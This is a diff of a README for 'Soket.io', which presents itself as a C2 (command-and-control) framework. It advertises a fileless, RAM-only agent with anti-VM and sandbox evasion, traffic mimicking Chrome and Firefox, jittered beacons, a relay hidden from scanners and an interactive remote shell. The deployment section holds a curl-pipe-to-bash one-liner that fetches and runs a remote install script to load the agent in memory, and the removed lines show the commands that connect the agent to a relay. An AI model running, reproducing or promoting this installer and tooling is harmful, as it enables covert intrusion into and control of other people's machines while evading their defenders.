@@ -1,93 +1,83 @@
-# SOKET.IO v1.0 | Unified Socket Infrastructure
+# SOKET.IO v1.0 | UNIFIED SOCKET INFRASTRUCTURE
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Security](https://img.shields.io/badge/Security-BearSSL-cyan.svg)](https://bearssl.org/)
-[![Arch](https://img.shields.io/badge/Arch-Multi--Arch-green.svg)](#supported-architectures)
-[![Status](https://img.shields.io/badge/Status-v1.0-red.svg)](#deployment)
+<p align="center">
+  <img src="https://capsule-render.vercel.app/render?type=soft&color=00f2ff&height=200&section=header&text=SOKET.IO&fontSize=90&animation=fadeIn&fontAlignY=38" alt="Soket.io Header" />
+</p>
 
-**Soket.io v1.0** is a C2 infrastructure engineered for supreme stealth, absolute resilience, and kernel-level interaction. Standardized for production deployment, it provides a hardened communication layer for advanced Red Team operations.
+Soket.io is a high-performance C2 infrastructure engineered for absolute resilience, stealth communication, and kernel-level monitoring. This framework provides a hardened layer for advanced operations with a zero-trace forensic footprint.
 
 ---
 
-## 🏗️ Technical Architecture
+### TECH STACK
 
-| Component | Responsibility | Technology Stack |
+**Backend Core**
+<p align="left">
+  <img src="https://img.shields.io/badge/Golang-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go" />
+  <img src="https://img.shields.io/badge/C99-A8B9CC?style=for-the-badge&logo=c&logoColor=black" alt="C" />
+  <img src="https://img.shields.io/badge/Musl--Libc-3EBEFF?style=for-the-badge&logo=linux&logoColor=white" alt="Musl" />
+</p>
+
+**Security & Crypto**
+<p align="left">
+  <img src="https://img.shields.io/badge/BearSSL-00f2ff?style=for-the-badge&logo=securityscorecard&logoColor=black" alt="BearSSL" />
+  <img src="https://img.shields.io/badge/TLS_1.3-444444?style=for-the-badge&logo=lock&logoColor=white" alt="TLS" />
+  <img src="https://img.shields.io/badge/Ed25519-222222?style=for-the-badge&logo=keybase&logoColor=white" alt="Ed25519" />
+</p>
+
+**Infrastructure & DevOps**
+<p align="left">
+  <img src="https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white" alt="Git" />
+  <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" />
+  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind" />
+</p>
+
+---
+
+### CORE ARCHITECTURE
+
+| Layer | Component | Technical Detail |
 | :--- | :--- | :--- |
-| **Client Agent** | Stealth execution & Monitoring | C99, BearSSL, Monocypher, Inotify |
-| **Relay Multiplexer** | Session management & Routing | Go 1.22, TLS Mimicry, Ed25519 |
-| **Signaling Server** | Discovery & Hole-punching | Go 1.22, WebSockets, DGA, Tor |
-
-### 🛰️ Infrastructure Flow
-```text
-[Operator Console] <---> [Relay Multiplexer (PSK + TLS 1.3)] <---> [Client Agent (RAM-Only)]
-                                     ^
-                                     |
-                          [Signaling & Discovery]
-```
+| **Agent** | Client | Pure C99, Fileless Memfd, Inotify FIM |
+| **Relay** | Multiplexer | Go 1.22, L7 TLS Mimicry, Ed25519 Identity |
+| **Tunnel** | Transport | WebSocket over TLS, PSK Pre-Auth |
 
 ---
 
-## 🛡️ Security & Evasion Features
+### SECURITY FEATURES
 
-| Feature | Technical Implementation | Purpose |
-| :--- | :--- | :--- |
-| **Anti-VM** | CPUID & Artifact Scanning | Prevents execution in Sandboxes/VMs |
-| **Fileless Execution** | `memfd_create` | Resides entirely in RAM (No disk trace) |
-| **L7 Mimicry** | TLS Fingerprinting | Mimics Chrome/Firefox HTTPS traffic |
-| **Jittered Heartbeat** | Randomized intervals | Defeats traffic pattern analysis |
-| **Pre-Auth PSK** | TCP-level verification | Hides Relay from Shodan/Nmap scans |
-| **Interactive PTY** | `forkpty` integration | Seamless sudo/nano/terminal support |
+- **Anti-VM Detection**: Integrated CPUID and artifact scanning to bypass sandbox environments.
+- **Jittered Heartbeat**: Randomized communication intervals to defeat traffic pattern analysis.
+- **L7 Mimicry**: Traffic fingerprints disguised as legitimate HTTPS (Chrome/Firefox) traffic.
+- **PTY Interactive Shell**: Full terminal support via forkpty for seamless administrative control.
+- **PSK Pre-Auth**: 4-byte TCP-level pre-authentication to hide infrastructure from public scans.
 
 ---
 
-## 🚀 Deployment Guide
+### DEPLOYMENT
 
-### 1. Unified One-Liner (Standard)
-The fastest way to deploy the agent in memory:
+**Memory-Only Installation**
 ```bash
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh)"
 ```
 
-### 2. Manual Build (Production)
+**Manual Static Build**
 ```bash
-# Build Client Agent
+# Agent compilation
 cd client && make clean && make prod
 
-# Build Relay Server
+# Relay compilation
 cd relay && CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/phantom-relay cmd/relay/main.go
 ```
 
-### 3. Verification
-Run the automated auditor to ensure 100% static linkage:
-```bash
-bash verify_build.sh
-```
+---
+
+### OPERATIONAL COMMANDS
+
+Standardized aliases for rapid deployment:
+
+- **gs-oyen-s**: Unified agent binary deployment.
+- **gs-oyen-r**: High-concurrency relay multiplexer.
 
 ---
 
-## 📂 Operational Commands
-
-Standardized aliases for quick access:
-- **`gs-oyen-s`**: The unified agent binary.
-- **`gs-oyen-r`**: The high-performance relay multiplexer.
-
-### Example:
-```bash
-# Start Relay with custom listener
-gs-oyen-r -listen 0.0.0.0:443
-
-# Execute Agent with PSK
-gs-oyen-s -s "SECRET_KEY" -i "RELAY_IP" -m 443
-```
-
----
-
-## ❓ FAQ & Troubleshooting
-
-- **GLIBC Error?**: Use the provided static builds. Our binaries are linked with `musl-libc` to ensure zero dependencies on host libraries.
-- **404/Connection Refused?**: Verify the PSK (Pre-Shared Key). The relay will drop any connection that does not provide the correct 4-byte PSK before the TLS handshake.
-- **PTY Session Hangs?**: Ensure your terminal supports `xterm-256color` for full interactive compatibility.
-
----
-
-&copy; 2026 Oyen-Sec Infrastructure. Engineered for absolute resilience.
+&copy; 2026 Oyen-Sec Infrastructure. Built for absolute resilience.
